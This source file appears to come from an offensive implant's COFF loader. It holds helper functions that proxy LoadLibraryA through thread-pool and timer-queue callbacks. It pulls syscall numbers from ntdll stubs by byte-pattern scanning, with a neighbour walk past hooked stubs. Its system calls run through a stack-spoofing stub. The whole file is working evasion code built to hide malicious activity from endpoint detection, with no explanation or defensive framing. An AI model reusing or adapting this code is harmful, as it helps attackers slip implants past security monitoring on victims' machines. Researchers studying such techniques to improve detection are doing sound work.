#include <windows.h>

#include "Prototypes.h"
#include "Native.h"
#include "Vulcan.h"
#include "Macros.h"

#define DOWN                        32
#define SYSCALL_GADGET_OFFSET       0x12

typedef struct _WORKER_ARGS {
    void*   pLoadLibraryA;
    LPSTR   lpModuleName;
} WORKER_ARGS, *PWORKER_ARGS;

D_SEC(D)
HMODULE ThreadPoolLoadLibraryA
(
    _In_    PVOID   pLoadLibraryA,
    _In_    LPSTR  lpModuleName
)
{
    WORKER_ARGS WorkerArgs = { pLoadLibraryA, lpModuleName };
    PTP_WORK WorkReturn = NULL;

    NTSTATUS Status = DRAUGR_API(TpAllocWork, &WorkReturn, (PTP_WORK_CALLBACK)&WorkCallback, &WorkerArgs, NULL);
	
    if (!NT_SUCCESS(Status) || !WorkReturn) {
        return NULL;
    }

    DRAUGR_API(TpPostWork, WorkReturn);
    DRAUGR_API(TpReleaseWork, WorkReturn);

    HMODULE   pModAddress = nullptr;
    for(int i = 0; i < 5; i++)
    {
            pModAddress = (HMODULE)ResolveModuleAddressWithHash(HashStringA(lpModuleName));

        if(pModAddress)
        {
            break;
        }
        else
        {
            LARGE_INTEGER liWait;
            liWait.QuadPart = -1000000LL; 
            DRAUGR_API(NtWaitForSingleObject, NtCurrentProcess, FALSE, &liWait);
        }
    }
    return pModAddress;
}

D_SEC(D)
HMODULE TimerLoadLibraryA(_In_ PVOID pLoadLibraryA, _In_ LPSTR lpModuleName)
{

    HANDLE hTimerQueue = NULL;
    HMODULE pModAddress = nullptr;
    HANDLE hNewTimer = NULL;

    NTSTATUS Status = (NTSTATUS)DRAUGR_API(RtlCreateTimerQueue, &hTimerQueue);
    if (!NT_SUCCESS(Status) || !hTimerQueue) {
        return nullptr;
    }

    Status = (NTSTATUS)DRAUGR_API(RtlCreateTimer,
        hTimerQueue,
        &hNewTimer,
        (WAITORTIMERCALLBACKFUNC)pLoadLibraryA,
        (PVOID)lpModuleName,
        100,
        0,
        WT_EXECUTEINTIMERTHREAD
    );
    if (!NT_SUCCESS(Status))
    {
        DRAUGR_API(RtlDeleteTimerQueue, hTimerQueue);
        return nullptr;
    }

    LARGE_INTEGER liTimeout;
    liTimeout.QuadPart = -5000000LL; 
    DRAUGR_API(NtWaitForSingleObject,NtCurrentProcess, FALSE, &liTimeout);

    pModAddress = (HMODULE)ResolveModuleAddressWithHash(HashStringA(lpModuleName));

    DRAUGR_API(RtlDeleteTimer, hTimerQueue, hNewTimer, NULL);
    DRAUGR_API(RtlDeleteTimerQueue, hTimerQueue);

    return pModAddress;
}

D_SEC(D)
HMODULE CoffLoadLibraryA(
    _In_    LOADLIB_METHOD  Method,
    _In_    LPSTR  lpModuleName
)
{
    switch(Method)
    {
        case THREAD_POOL:
        {
            return ThreadPoolLoadLibraryA(GLOBAL_INSTANCE->WinApi.LoadLibraryA, lpModuleName);
        }

        case PROXY_TIMER:
        {
            return TimerLoadLibraryA(GLOBAL_INSTANCE->WinApi.LoadLibraryA, lpModuleName);
        }

        default:
        {
            return (HMODULE)DRAUGR_API(LoadLibraryA, lpModuleName);
        }
    }
}

D_SEC(D)
bool    CoffResolveSyscall(
    _In_    LPSTR  lpFunctionName,
    _Inout_ PVOID   *ppGadget,
    _Inout_ PDWORD  pdwSyscall
)
{
    PVOID   pFunction =  ResolveProcedureAddressWithHash(
		GLOBAL_INSTANCE->EafGadget, 
		GLOBAL_INSTANCE->Module.Ntdll, 
		HashStringA(lpFunctionName)
	);
    if(!pFunction) {
        return FALSE;
    }

	if (
		((PBYTE)pFunction)[0] == 0x4C &&
		((PBYTE)pFunction)[1] == 0x8B &&
		((PBYTE)pFunction)[2] == 0xD1 &&
		((PBYTE)pFunction)[3] == 0xB8 &&
		((PBYTE)pFunction)[6] == 0x00 &&
		((PBYTE)pFunction)[7] == 0x00
		)
	{
		BYTE high = ((PBYTE)pFunction)[5];
		BYTE low = ((PBYTE)pFunction)[4];

		*pdwSyscall = (high << 8) | low;
		*ppGadget = reinterpret_cast<PVOID>((DWORD64)pFunction + SYSCALL_GADGET_OFFSET);

		return TRUE;
	}
	else {
		for (int i = 1; i < 500; i++)
		{
			if (
				((PBYTE)pFunction)[i * DOWN]     == 0x4C &&
				((PBYTE)pFunction)[i * DOWN + 1] == 0x8B &&
				((PBYTE)pFunction)[i * DOWN + 2] == 0xD1 &&
				((PBYTE)pFunction)[i * DOWN + 3] == 0xB8 &&
				((PBYTE)pFunction)[i * DOWN + 6] == 0x00 &&
				((PBYTE)pFunction)[i * DOWN + 7] == 0x00
				)
			{
				BYTE high = ((PBYTE)pFunction)[5 + i * DOWN];
				BYTE low = ((PBYTE)pFunction)[4 + i * DOWN];

				*pdwSyscall = (high << 8) | low;
				*ppGadget = reinterpret_cast<PVOID>((DWORD64)pFunction + SYSCALL_GADGET_OFFSET);

				return TRUE;
			}
		}
	}

	return FALSE;
}

D_SEC(D)
UINT_PTR	CoffSpoofCall(
	_In_	PVOID		pFunction,
	_In_	DWORD		dwSyscall,
	_In_	PVOID	Rcx,
	_In_	PVOID	Rdx,
	_In_	PVOID	R8,
	_In_	PVOID	R9,
	_In_	PVOID	StackArg1,
	_In_	PVOID	StackArg2,
	_In_	PVOID	StackArg3,
	_In_	PVOID	StackArg4,
	_In_	PVOID	StackArg5,
	_In_	PVOID	StackArg6,
	_In_	PVOID	StackArg7,
	_In_	PVOID	StackArg8
)
{
    if(dwSyscall) {
      GLOBAL_INSTANCE->Param.Ssn = (PVOID)(UINT_PTR)dwSyscall;
    }

    return SpoofStub(
		Rcx, 
		Rdx, 
		R8, 
		R9,
		&GLOBAL_INSTANCE->Param, 
		pFunction, 
		8,
		StackArg1, 
		StackArg2, 
		StackArg3, 
		StackArg4, 
		StackArg5, 
		StackArg6, 
		StackArg7, 
		StackArg8
	);
}

D_SEC(D)
PVOID	CoffAlloc(
	_In_	SIZE_T	stSize
)
{
	return (PVOID)DRAUGR_API(RtlAllocateHeap, GLOBAL_INSTANCE->CoffInfo.Heap, HEAP_ZERO_MEMORY, stSize);
}

D_SEC(D)
PVOID	CoffFree(
	_In_	PVOID	pAddress
)
{
	return (PVOID)DRAUGR_API(RtlFreeHeap, GLOBAL_INSTANCE->CoffInfo.Heap, HEAP_NO_SERIALIZE, pAddress);
}

